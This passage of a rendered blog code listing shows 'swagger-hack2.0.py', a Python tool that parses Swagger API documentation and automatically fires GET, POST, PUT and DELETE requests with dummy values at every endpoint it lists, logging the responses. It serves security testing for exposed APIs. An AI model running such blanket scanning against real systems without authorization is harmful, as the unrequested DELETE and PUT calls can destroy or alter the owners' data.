class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        pre = spec[<span class="string">&#x27;url&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] : 开始测试 %s 标准&quot;</span>%(spec_url))</span><br><span class="line">        check_spec(spec_url,url + <span class="string">&quot;/&quot;</span> + pre,f)</span><br><span class="line">        <span class="comment">#break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>swagger-hack2.0.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> json,os,re</span><br><span class="line"><span class="keyword">import</span> time, sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">logger.remove()</span><br><span class="line">handler_id = logger.add(sys.stderr, level=<span class="string">&quot;DEBUG&quot;</span>)<span class="comment">#设置输出级别</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_array = &#123;<span class="string">&quot;string&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;boolean&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;integer&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;array&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;number&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;object&quot;</span>:<span class="string">&quot;&quot;</span>&#125; <span class="comment">#根据参数类型进行赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#post类型就发送这个数据</span></span><br><span class="line">json_payload = <span class="string">&quot;&quot;&quot;&#123;</span></span><br><span class="line"><span class="string">  &quot;code&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;createTime&quot;: &quot;2021-02-05T10:34:37.691Z&quot;,</span></span><br><span class="line"><span class="string">  &quot;delFlag&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;deptId&quot;: 0,</span></span><br><span class="line"><span class="string">  &quot;fullName&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;fullPathCode&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;fullPathName&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;isVirtual&quot;: true,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;outCode&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;outParentCode&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;parentCode&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;parentId&quot;: 0,</span></span><br><span class="line"><span class="string">  &quot;parentName&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;sort&quot;: 0,</span></span><br><span class="line"><span class="string">  &quot;updateTime&quot;: &quot;2021-02-05T10:34:37.691Z&quot;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    logger.info(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                              _                _    </span></span><br><span class="line"><span class="string"> _____      ____ _  __ _  __ _  ___ _ __     | |__   __ _  ___| | __</span></span><br><span class="line"><span class="string">/ __\ \ /\ / / _` |/ _` |/ _` |/ _ \ &#x27;__|____| &#x27;_ \ / _` |/ __| |/ /</span></span><br><span class="line"><span class="string">\__ \\ V  V / (_| | (_| | (_| |  __/ | |_____| | | | (_| | (__|   &lt; </span></span><br><span class="line"><span class="string">|___/ \_/\_/ \__,_|\__, |\__, |\___|_|       |_| |_|\__,_|\___|_|\_\\</span></span><br><span class="line"><span class="string">                   |___/ |___/                                      </span></span><br><span class="line"><span class="string">                                                            by jayus</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">python swagger.py -h</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url = url, timeout = <span class="number">5</span>, verify = <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;html&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            logger.debug(<span class="string">&quot;[+] 输入url为swagger首页，开始解析api文档地址&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span> <span class="comment">#html</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\&quot;parameters\&quot;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            logger.debug(<span class="string">&quot;[+] 输入url为api文档地址，开始构造请求发包&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> <span class="comment">#api doc</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\&quot;location\&quot;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            logger.debug(<span class="string">&quot;[+] 输入url为resource地址，开始解析api文档地址&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> <span class="comment">#source</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;kill&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">savedata</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.csv&quot;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;.txt&quot;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_api_docs_pathes</span>(<span class="params">resource_url</span>):<span class="comment">#输入resource，解析出各api文档的url</span></span><br><span class="line">    domain = urlparse(resource_url)</span><br><span class="line">    domain = domain.scheme + <span class="string">&quot;://&quot;</span> + domain.netloc</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url = resource_url, verify = <span class="literal">False</span>, timeout = <span class="number">10</span>)</span><br><span class="line">        resources = json.loads(res.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    pathes = []</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(resources,<span class="built_in">tuple</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;apis&quot;</span> <span class="keyword">in</span> resources.keys():<span class="comment">#版本不同，格式不一样</span></span><br><span class="line">            <span class="keyword">for</span> api_docs <span class="keyword">in</span> resources[<span class="string">&#x27;apis&#x27;</span>]:</span><br><span class="line">                pathes.append(domain + api_docs[<span class="string">&#x27;path&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> pathes</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> resources:</span><br><span class="line">            pathes.append(domain + i[<span class="string">&#x27;location&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> pathes</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_source</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_docs</span>(<span class="params">url,global_data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        domain = urlparse(url)</span><br><span class="line">        domain = domain.scheme + <span class="string">&quot;://&quot;</span> + domain.netloc</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url = url, timeout = <span class="number">5</span>, verify = <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logger.error(<span class="string">&quot;timeout...&quot;</span>)</span><br><span class="line">        res = json.loads(res.text)</span><br><span class="line">        basePath = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;basePath&quot;</span> <span class="keyword">in</span> res.keys():</span><br><span class="line">            basePath = res[<span class="string">&#x27;basePath&#x27;</span>]  <span class="comment">#eg:/santaba/rest</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;servers&quot;</span> <span class="keyword">in</span> res.keys():</span><br><span class="line">            basePath = res[<span class="string">&quot;servers&quot;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            basePath = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        paths = res[<span class="string">&#x27;paths&#x27;</span>]</span><br><span class="line">        path_num = <span class="built_in">len</span>(paths)</span><br><span class="line">        logger.info(<span class="string">&quot;[+] &#123;&#125; has &#123;&#125; paths&quot;</span>.<span class="built_in">format</span>(url,<span class="built_in">len</span>(paths)))</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> paths:<span class="comment">#path字符串</span></span><br><span class="line">            res_path = path</span><br><span class="line">            logger.debug(<span class="string">&quot;test on &#123;&#125; =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url,path))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> paths[res_path]:<span class="comment">#get/post/字符串</span></span><br><span class="line">                    path = res_path</span><br><span class="line">                    text = <span class="built_in">str</span>(paths[path][method])</span><br><span class="line">                    param_num = text.count(<span class="string">&quot;&#x27;in&#x27;:&quot;</span>)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        summary = paths[path][method][<span class="string">&#x27;summary&#x27;</span>] </span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        summary = path</span><br><span class="line">                    <span class="keyword">if</span> method == <span class="string">&#x27;post&#x27;</span> <span class="keyword">or</span> method == <span class="string">&#x27;put&#x27;</span>:<span class="comment">#这两种请求，参数如何构造在接口文档中没有，暂时不知道在哪找，所以随便发一个包</span></span><br><span class="line">                                                            <span class="comment">#post分没参数和有参数两种，没参数直接随便post个json，有参数但是in body还是json</span></span><br><span class="line">                                                            <span class="comment">#有参数但是in path 就判断类型填到path 。in query就需要构造了</span></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;&#x27;in&#x27;: &#x27;body&#x27;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">                                req = requests.post(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.put(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                        <span class="keyword">elif</span> <span class="string">&quot;&#x27;in&#x27;: &#x27;path&#x27;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">                            param_map = &#123;&#125;</span><br><span class="line">                            parameters = paths[path][method][<span class="string">&#x27;parameters&#x27;</span>]</span><br><span class="line">                            <span class="keyword">for</span> param <span class="keyword">in</span> parameters:</span><br><span class="line">                                p_type = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    p_type = param[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                <span class="keyword">elif</span> <span class="string">&quot;schema&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param[<span class="string">&quot;schema&quot;</span>].keys():</span><br><span class="line">                                        p_type = param[<span class="string">&#x27;schema&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                p_name = param[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                                param_map[p_name] = payload_array[p_type]</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                                tmps = re.findall(<span class="string">&quot;\&#123;[^\&#125;]*\&#125;&quot;</span>,path)</span><br><span class="line">                                <span class="keyword">for</span> tmp <span class="keyword">in</span> tmps:</span><br><span class="line">                                    path = path.replace(tmp,param_map[tmp[<span class="number">1</span>:-<span class="number">1</span>]]) </span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">                                req = requests.post(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.put(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                        <span class="keyword">elif</span> <span class="string">&quot;&#x27;in&#x27;: &#x27;query&#x27;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">                            param_map = &#123;&#125;</span><br><span class="line">                            parameters = paths[path][method][<span class="string">&#x27;parameters&#x27;</span>]</span><br><span class="line">                            <span class="keyword">for</span> param <span class="keyword">in</span> parameters:</span><br><span class="line">                                p_type = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    p_type = param[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                <span class="keyword">elif</span> <span class="string">&quot;schema&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param[<span class="string">&quot;schema&quot;</span>].keys():</span><br><span class="line">                                        p_type = param[<span class="string">&#x27;schema&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                p_name = param[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                                param_map[p_name] = payload_array[p_type]</span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">                                req = requests.post(url = domain + basePath + path , data = param_map,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,param_map,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.put(url = domain + basePath + path , data = param_map,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,param_map,req.status_code,req.text]</span><br><span class="line">                        <span class="keyword">else</span>:<span class="comment">#没有parameters这个key</span></span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">                                req = requests.post(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.put(url = domain + basePath + path , data = json_payload,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,domain + basePath + path,param_num,json_payload,req.status_code,req.text]</span><br><span class="line">                        global_data.put(hhh)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> method == <span class="string">&quot;get&quot;</span> <span class="keyword">or</span> method == <span class="string">&quot;delete&quot;</span>:</span><br><span class="line">                        querystring = <span class="string">&quot;&quot;</span></span><br><span class="line">                        param_map = &#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;parameters&quot;</span> <span class="keyword">in</span> paths[path][method].keys():<span class="comment">#有参数</span></span><br><span class="line">                            parameters = paths[path][method][<span class="string">&#x27;parameters&#x27;</span>]</span><br><span class="line">                            <span class="keyword">for</span> param <span class="keyword">in</span> parameters:</span><br><span class="line">                                p_type = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    p_type = param[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                <span class="keyword">elif</span> <span class="string">&quot;schema&quot;</span> <span class="keyword">in</span> param.keys():</span><br><span class="line">                                    <span class="keyword">if</span> <span class="string">&quot;type&quot;</span> <span class="keyword">in</span> param[<span class="string">&quot;schema&quot;</span>].keys():</span><br><span class="line">                                        p_type = param[<span class="string">&#x27;schema&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">                                p_in = param[<span class="string">&#x27;in&#x27;</span>]</span><br><span class="line">                                p_name = param[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                    param_map[p_name] = payload_array[p_type]</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                    logger.error(<span class="string">&quot;参数类型不全，需要手动添加... =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p_type))</span><br><span class="line">                            <span class="keyword">for</span> key <span class="keyword">in</span> param_map.keys():</span><br><span class="line">                                querystring = querystring + key + <span class="string">&quot;=&quot;</span> + param_map[key] + <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                                tmps = re.findall(<span class="string">&quot;\&#123;[^\&#125;]*\&#125;&quot;</span>,path)</span><br><span class="line">                                <span class="keyword">for</span> tmp <span class="keyword">in</span> tmps:</span><br><span class="line">                                    path = path.replace(tmp,param_map[tmp[<span class="number">1</span>:-<span class="number">1</span>]]) <span class="comment">#替换掉basePath里的&#123;abc&#125;</span></span><br><span class="line">                            query_url = domain + basePath + path + <span class="string">&#x27;/?&#x27;</span> + querystring[:-<span class="number">1</span>]</span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                                req = requests.get(url = query_url,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,query_url,param_num,param_map,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.delete(url = query_url,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,query_url,param_num,param_map,req.status_code,req.text]</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">else</span>:<span class="comment">#无参数</span></span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                query_url = domain + basePath + path</span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span class="built_in">print</span>(e)</span><br><span class="line">                            <span class="keyword">if</span> method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                                req = requests.get(url = query_url,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,query_url,param_num,param_map,req.status_code,req.text]</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                req = requests.delete(url = query_url,timeout = <span class="number">5</span>,verify = <span class="literal">False</span>)</span><br><span class="line">                                hhh = [url,summary,path,method,query_url,param_num,param_map,req.status_code,req.text]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        global_data.put(hhh)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logger.error(<span class="string">&quot;[!] 遇到了没有添加的请求方法...&#123;&#125;&quot;</span>.<span class="built_in">format</span>(method))</span><br><span class="line">                        <span class="comment">#exit()</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logger.error(e)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_html</span>(<span class="params">urlq,q</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">data</span>):</span><br><span class="line">    url = data[<span class="number">0</span>]</span><br><span class="line">    q = data[<span class="number">1</span>]</span><br><span class="line">    url_type = check(url)</span><br><span class="line">    <span class="keyword">if</span> url_type == <span class="number">0</span>:</span><br><span class="line">        logger.error(<span 